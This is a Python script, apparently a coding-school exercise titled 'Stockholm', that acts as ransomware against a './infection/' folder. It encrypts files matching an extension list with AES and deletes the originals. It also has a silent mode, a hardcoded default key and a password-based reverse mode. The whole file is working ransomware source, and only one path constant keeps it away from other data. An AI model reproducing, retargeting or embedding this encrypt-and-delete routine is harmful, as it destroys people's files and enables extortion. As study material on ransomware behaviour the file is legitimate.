import os
import glob
import hashlib
from Crypto.Cipher import AES
import sys
key = b'password42424242'
silent = 0
PATH = './infection/'
EXTENSIONS = './extensions'
HASHES_FILE = './file_hashes'

def doDir(directory, flag):
    with open(EXTENSIONS, 'r') as extensionsFile:
        allowedExtensions = [extension.strip().lower() for extension in extensionsFile.readlines()]
    pattern = os.path.join(directory, '*')
    files = glob.glob(pattern)
    for file in files:
        if flag == 0:
            encryptFile(file, allowedExtensions)
        else:
            reverseEncrypt(file)
            
def deleteHashes():
    if os.path.exists(HASHES_FILE):
            os.remove(HASHES_FILE)

def encryptFile(file, EXTENSIONS):
    fileEx = os.path.splitext(file)[1]
    if fileEx in EXTENSIONS:
        with open(file, 'rb') as fileR:
            plain = fileR.read()
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(plain)
        hash = generateHash(file)
        
        with open(HASHES_FILE, 'a') as hashes:
            hashes.write(file + ':' + hash + '\n')
        encryptFilePath = file + '.ft'
        with open(encryptFilePath, 'wb') as encryptedFile:
            [encryptedFile.write(x) for x in (cipher.nonce, tag, ciphertext)]
        os.remove(file)
        if silent == 0:
            print("File", file, "encrypted")

def reverseEncrypt(file):
    with open(HASHES_FILE, 'r') as hashes:
        lines = hashes.readlines()
    if not lines:
        print("No hashs found in", HASHES_FILE)
    for line in lines:
        line = line.strip()
        parts = line.split(':')
        if len(parts) == 2 and parts[0].lower() == file.lower():
            originalHash = parts[1]
            print("Original Hash:", originalHash)
            with open(file, 'rb') as encryptedFile:
                nonce, tag, ciphertext = [encryptedFile.read(x) for x in (16, 16, -1)]    
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plain = cipher.decrypt_and_verify(ciphertext, tag)
            decryptedFileName = file[:-3]
            with open(decryptedFileName, 'wb') as decryptedFile:
                decryptedFile.write(plain)
            decryptedHash = generateHash(decryptedFileName)
            print("Decrypted Hash:", decryptedHash)
            if originalHash == decryptedHash:
                if silent == 0:
                    print("File", file, "decrypted successfully.")
                os.remove(file)
            else:
                print("Failed to decrypt", file)

def generateHash(file):
    BLOCK_SIZE = 65536 #64KB
    fileHash = hashlib.sha256()
    
    with open(file, 'rb') as f:
        buf = f.read(BLOCK_SIZE)
        while len(buf) > 0:
            fileHash.update(buf)
            buf = f.read(BLOCK_SIZE)
        
    return fileHash.hexdigest()
    
def getPassword(inputPass):
    global key
    if len(inputPass) != 16 and len(inputPass) != 24 and len(inputPass) != 32:
        print("Invalid key length")
        exit(1)
    else:
        key = inputPass.encode()

def help():
    print("Use -help or -h to show this message")
    print("Use -version or -v to show program version")
    print("Use -password or -p to set the encryption password and encrypt the files")
    print("Use -reverse or -r to revert the encryption")
    print("Use -silent or -s to avoid printing the files that are being encrypted")
    print("Without -password or -p it will use the default password")
    print("You can combine some of the flags, for example: ./stockholm -s -r or ./stockholm -s -r -p yourpass")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        for a in sys.argv[1:]:
            if a == "-help" or a == "-h":
                help()
            if a == "-version" or a == "-v":
                print("Stockholm v0 by mvillaes")
            if a == "-silent" or a == "-s":
                silent = 1
                doDir(PATH, 0)
            if a == "-reverse" or a == "-r":
                if len(sys.argv) > sys.argv.index(a) + 2:
                    if sys.argv[sys.argv.index(a) + 1] == "-p" or  sys.argv[sys.argv.index(a) + 1] == "-password":
                        getPassword(sys.argv[sys.argv.index(a) + 2])
                doDir(PATH, 1)
                #deleteHashes()
            if a == "-password" or a == "-p":
                getPassword(sys.argv[sys.argv.index(a) + 1])
                #deleteHashes()
                doDir(PATH, 0)
    else:
        #deleteHashes()
        doDir(PATH, 0)